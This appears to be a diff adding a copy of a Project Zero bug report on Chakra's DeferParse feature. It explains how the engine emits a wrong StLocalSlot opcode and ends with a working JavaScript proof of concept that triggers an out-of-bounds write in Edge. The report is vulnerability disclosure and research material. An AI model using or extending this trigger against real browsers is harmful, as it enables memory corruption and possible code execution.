@@ -1,0 +1,85 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1310
+
+(function f(a = (function () {
+    print(a);
+    with ({});
+})()) {
+    function g() {
+        f;
+    }
+})();
+
+When Chakra executes the above code, it doesn't generate bytecode for "g". This is a feature called "DeferParse". The problem is that the bytecode generated for "f" when the feature is enabled is different to the bytecode generated when the feature is disabled. This is because of "ByteCodeGenerator::ProcessScopeWithCapturedSym" which changes the function expression scope's type is not called when the feature is enabled.
+
+Here's a snippet of the method which emits an incorrect opcode.
+void ByteCodeGenerator::LoadAllConstants(FuncInfo *funcInfo)
+{
+    ...
+    if (funcExprWithName)
+    {
+        if (funcInfo->GetFuncExprNameReference() ||
+            (funcInfo->funcExprScope && funcInfo->funcExprScope->GetIsObject()))
+        {
+            ...
+            Js::RegSlot ldFuncExprDst = sym->GetLocation();
+            this->m_writer.Reg1(Js::OpCode::LdFuncExpr, ldFuncExprDst);
+
+            if (sym->IsInSlot(funcInfo))
+            {
+                Js::RegSlot scopeLocation;
+                AnalysisAssert(funcInfo->funcExprScope);
+
+                if (funcInfo->funcExprScope->GetIsObject())
+                {
+                    scopeLocation = funcInfo->funcExprScope->GetLocation();
+                    this->m_writer.Property(Js::OpCode::StFuncExpr, sym->GetLocation(), scopeLocation,
+                        funcInfo->FindOrAddReferencedPropertyId(sym->GetPosition()));
+                }
+                else if (funcInfo->bodyScope->GetIsObject())
+                {
+                    this->m_writer.ElementU(Js::OpCode::StLocalFuncExpr, sym->GetLocation(),
+                        funcInfo->FindOrAddReferencedPropertyId(sym->GetPosition()));
+                }
+                else
+                {
+                    Assert(sym->HasScopeSlot());
+                    this->m_writer.SlotI1(Js::OpCode::StLocalSlot, sym->GetLocation(),
+                                          sym->GetScopeSlot() + Js::ScopeSlots::FirstSlotIndex);
+                }
+            }
+            ...
+        }
+    }
+    ...
+}
+
+As you can see, it only handles "funcExprScope->GetIsObject()" or "bodyScope->GetIsObject()" but not "paramScope->GetIsObject()".
+Without the feature, there's no case that only "paramScope->GetIsObject()" returns true because "ByteCodeGenerator::ProcessScopeWithCapturedSym" for "f" is always called and makes "funcInfo->funcExprScope->GetIsObject()" return true.
+But with the feature, the method is not called. So it ends up emitting an incorrect opcode "Js::OpCode::StLocalSlot".
+
+The feature is enabled in Edge by default.
+
+PoC:
+-->
+
+let h = function f(a0 = (function () {
+    a0;
+    a1;
+    a2;
+    a3;
+    a4;
+    a5;
+    a6;
+    a7 = 0x99999;  // oob write
+
+    with ({});
+})(), a1, a2, a3, a4, a5, a6, a7) {
+    function g() {
+        f;
+    }
+};
+
+for (let i = 0; i < 0x10000; i++) {
+    h();
+}
